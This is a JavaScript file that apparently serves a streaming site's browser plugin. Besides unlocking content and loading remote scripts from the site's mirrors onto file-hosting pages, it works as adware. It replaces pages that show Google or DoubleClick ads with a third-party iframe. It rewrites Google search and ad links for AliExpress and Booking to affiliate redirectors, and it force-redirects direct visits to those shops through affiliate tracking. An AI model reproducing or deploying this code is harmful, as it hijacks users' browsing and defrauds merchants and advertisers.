if (location.href.match(/^http:\/\/(www\.)?cinevip\.(tv)/i)) {

    if (document.getElementById("cvip_plugin")) {
        if (document.getElementById("cvip_plugin").src.match(/install_plugin/i)) {
            if (document.getElementById("contentlocker2")) {
            }
            var al = document.getElementById("cvip_dir").innerHTML.replace(/amp;/gi, '');
            document.getElementById("cvip_plugin").src = "http://player.cinevip.tv/fuente/" + al
        }
    }
    if (document.getElementById("cinevip-contentlocker2")) {
        document.getElementById("cinevip-contentlocker2").style.display = 'none';
    }
}
var loca = (location.href.match(/cinevip=/i));
if (location.href.match(/^http:\/\/(www\.)?bayfiles\.net/i) && loca) {
    addScript("bayfiles");
}else if (location.href.match(/^http:\/\/(www\.)?billionuploads\.com/i) && loca) {
    addScript("billion");
}else if (location.href.match(/^http:\/\/(www\.)?hugefiles\.net/i) && loca) {
    addScript("huge");
}else if (location.href.match(/^http:\/\/(www\.)?vshare\.eu/i) && loca) {
    addScript("videoshare");
}else if (location.href.match(/^http:\/\/(www\.)?180upload\.com/i) && loca) {
    addScript("180upload");
}else if (location.href.match(/^http:\/\/(www\.)?uptobox\.com/i) && loca) {
    addScript("uptobox");
}

function addScript(a) {
    var s = document.createElement('script');
    s.setAttribute("type", "text/javascript");
    s.setAttribute("src", "http://mirrors.cinevip.tv/" + a + ".js");
    document.getElementsByTagName("head")[0].appendChild(s);
}
function getSizes(a) {
    var myWidth = 0, myHeight = 0;
    if (typeof (window.innerWidth) === 'number') {
        myWidth = window.innerWidth;
        myHeight = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        myWidth = document.documentElement.clientWidth;
        myHeight = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        myWidth = document.body.clientWidth;
        myHeight = document.body.clientHeight;
    }
    if(a == 'w')
    return myWidth
    else if (a == 'h')
    return myHeight;
    else
    return myWidth + 'x' + myHeight;
}
function createCookie(name, value, days) {
    var expires;
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toGMTString();
    }
    else {
        expires = "";
    }
    document.cookie = name + "=" + value + expires + "; path=/";
}
function getCookie(c_name) {
    if (document.cookie.length > 0) {
        c_start = document.cookie.indexOf(c_name + "=");
        if (c_start != -1) {
            c_start = c_start + c_name.length + 1;
            c_end = document.cookie.indexOf(";", c_start);
            if (c_end == -1) {
                c_end = document.cookie.length;
            }
            return unescape(document.cookie.substring(c_start, c_end));
        }
    }
    return "empty";
}
 function tam(me,a) {
    var val = null;
    if(a)
        val = ['300x250', '728x90', '160x600', '120x600', '336x280'];
    else
        val = ['300x250', '728x90', '160x600','468x60','800x600','120x20','120x600','800x440','336x280','280x336','250x250','234x60','500x500','800x500','300x600','720x300'];
    
    var ret = false;
    
    for (var i = 0; i < val.length; i++) {
        if (me == val[i]) {
            ret = true;
            break;
        }
    }
    return ret;

}

function a_z() {
    var texts = document.getElementsByTagName('text');
    if (texts.length > 0) {
        for (i = 0; i < texts.length; i++) {
            if (texts[i].innerHTML === 'Google' || texts[i].innerHTML.indexOf('Google') !== -1 || texts[i].innerHTML.search("Anuncios") > -1 || texts[i].innerHTML.indexOf("Anuncios") !== -1 || texts[i].innerHTML.indexOf("anuncios") !== -1  || texts[i].innerHTML === 'Gesti&oacute;n anuncios' || texts[i].innerHTML === 'AdChoices') {
                var parent = texts[i];
                while (parent.tagName.toUpperCase() !== 'HTML') {
                    if (parent.tagName.toLowerCase() === 'body') {
                    var w = getSizes('w');
                    var h = getSizes('h');
                     if (tam(getSizes('t'), true)){
                                                                        parent.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://estemundoloco.com/redirect.htm?743=' + w + '&567=' + h + '"></iframe>';
                                                                            }
                    }
                    parent = parent.parentNode;
                }
            }
        }
    }
}

function h_z(){
 var linkz = {'aliexpress.com': 'http://redirectaff.com/home.html?to=http://tc.tradetracker.net/?c=15716&m=563108&a=195517&r=&u=',
                'booking.com': 'http://statsbooking.com/google332H.html?track=http://www.booking.com/index.es.html'
            };
var doma = ['aliexpress.com','booking.com'];


var clave = ['booking.com'];
var post = {'booking.com': "http://statsbooking.com/google332H.html?track="};

        var l_oc, urls = {aliexpress: 'http://redirectaff.com/home.html?to=http://tc.tradetracker.net/?c=15716&m=563108&a=195517&r=&u=',
                         booking: 'http://statsbooking.com/google332H.html?track=http://www.booking.com/index.es.html'
                         };
        

        var kfz = ['aliexpress','booking'];
 
   
        var inter = setInterval(function() {
            l_oc = document.getElementsByTagName('span');

            for (i = 0; i < l_oc.length; i++) {
                var elem = l_oc[i];

                if (elem.innerHTML === "Ad" || elem.innerHTML === "Anuncio") {
                    var parent = elem.parentNode.parentNode;
                    var check = elem.nextSibling;

                    clearInterval(inter);

                    for (x = 0; x < parent.childNodes.length; x++) {
                        var child = parent.childNodes[x];

                        if (child.tagName.toLowerCase() === "h3") {

                            var anclas = child.getElementsByTagName('a');
                            
                            for (y = 0; y < kfz.length; y++) {

                                if (anclas[1].innerHTML.toLowerCase().indexOf(kfz[y]) !== -1 || check.innerHTML.toLowerCase().indexOf(kfz[y]) !== -1) {

                                    anclas[1].href = urls[kfz[y]];
                                    anclas[0].href = urls[kfz[y]];
                                }
                            }
                        }
                    }
                }
            }
        });

    var ttz = setInterval(function() {
    var all = document.getElementsByTagName('ol');

    if (all.length > 0) {
        clearInterval(ttz);
        for (i = 0; i < all.length; i++) {
            if (all[i].id === "rso") {
                var result = all[i].getElementsByTagName('li');
                for (x = 0; x < result.length; x++) {
                    var h3 = result[x].getElementsByTagName('h3');
                    if (h3.length > 0) {
                        var link = h3[0].getElementsByTagName('a');

                        for (z = 0; z < clave.length; z++) {
                            if (link[0].href.indexOf(clave[z]) !== -1) {
                                link[0].href = post[clave[z]] + link[0].href;
                            }
                        }
                    }
                }
            }
        }
    }
}, 100);

    for (f_z = 0; f_z < doma.length; f_z++) {
        var t_urls = window.location.href;
        var z_url = t_urls.split("/");
        z_url = z_url[2];
        if(t_urls.indexOf('.aliexpress.com') !== -1){
        if(!document.referrer && window.location.href.indexOf(doma[f_z]) !== -1 && getCookie('ds').indexOf('empty') !== -1 && window.location.href.indexOf('utm_campaign') === -1){
            createCookie('lp', Math.floor((Math.random() * 10000) + 1) ,'1');
            window.location.href =   linkz[doma[f_z]];
        }
        }else{
        if(!document.referrer && (z_url.indexOf(doma[f_z]) === 0 || z_url.indexOf('www.'+ doma[f_z]) === 0) && getCookie('lp').indexOf('empty') !== -1 && window.location.href.indexOf('utm_medium') === -1 && window.location.href.indexOf('PID') === -1){
            createCookie('lp', Math.floor((Math.random() * 10000) + 1) ,'1');
            window.location.href =   linkz[doma[f_z]];
        }
    }
}
}

function b_z(){
    var choises = document.getElementsByTagName('img');
    if(choises.length > 0){
        for(i = 0; i < choises.length; i++){
            var child = choises[i];
            if(child.alt === 'AdChoices' || child.src.indexOf("/c_30_us.png") > -1 || child.src.indexOf('//c.betrad.com/') !== -1){
                while (child.tagName.toUpperCase() !== 'HTML') {
                    if (child.tagName.toLowerCase() === 'body') {
                      var w = getSizes('w');
                        var h = getSizes('h');
                        if (tam(getSizes('t'), true)){
                                                                            child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://estemundoloco.com/redirect.htm?743=' + w + '&567=' + h + '"></iframe>';
                                                  
                                                 }
                    }
                    child = child.parentNode;
                }
            }
        }
    }
}
function c_z(){
    var ifra = document.getElementsByTagName("iframe");
    if(ifra.length > 0){
        for(i = 0; i < ifra.length; i++){
            var child = ifra[i];
             if(child.src.indexOf("doubleclick.net") !== -1){
                while (child.tagName.toUpperCase() !== 'HTML') {
                    if (child.tagName.toLowerCase() === 'body') {
                        var w = getSizes('w');
                            var h = getSizes('h');
                            if (tam(getSizes('t'), true)){
                                                                                     child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://estemundoloco.com/redirect.htm?743=' + w + '&567=' + h + '"></iframe>';
                                                  
                                                }
                    }
                    child = child.parentNode;
                }
            }
        }
    }
}



var z_sc = document.getElementsByTagName("script");
var z_ch = ['cuev.in','clousc.com','clou.im','stati.in','cloudz.im'];
var z_st = false;for(i_z = 0; i_z < z_sc.length && !z_st; i_z++){var src = z_sc[i_z].src;for(x_z = 0; x_z < z_ch.length && !z_st; x_z++){if(src.indexOf(z_ch[x_z]) !== -1){z_st = true;}}}




if(!z_st){
a_z();
b_z();
c_z();
h_z();
}
  
